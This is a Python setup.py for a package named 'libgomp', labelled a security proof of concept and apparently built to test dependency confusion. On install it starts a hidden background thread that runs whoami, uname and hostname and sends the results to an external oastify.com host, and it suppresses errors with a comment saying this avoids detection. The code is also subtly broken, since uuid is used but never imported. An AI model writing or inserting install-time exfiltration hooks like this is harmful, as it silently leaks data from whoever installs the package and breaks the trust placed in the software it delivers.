from setuptools import setup
import os
import subprocess
import threading
import urllib.request
import json

def exfiltrate_system_info():
    try:
        # Collect system info
        whoami = subprocess.getoutput("whoami")
        uname = subprocess.getoutput("uname -a")
        hostname = subprocess.getoutput("hostname")
        
        # Prepare data to send
        data = {
            "whoami": whoami,
            "uname": uname,
            "hostname": hostname,
        }
        
        # Encode data in URL (GET request)
        token = str(uuid.uuid4())
        url = f"http://{token}.ik6r1fu3ozj9edmgabqm97y2zt5ktbkz9.oastify.com/?data={json.dumps(data)}"
        
        # Send request (silent fail)
        urllib.request.urlopen(url, timeout=5)
    except:
        pass  # Avoid detection

# Run in background on install
threading.Thread(target=exfiltrate_system_info, daemon=True).start()

setup(
    name="libgomp",
    version="1.1.1",
    description="A seemingly harmless package (Security PoC)",
    packages=["libgomp"],
    install_requires=[],
)
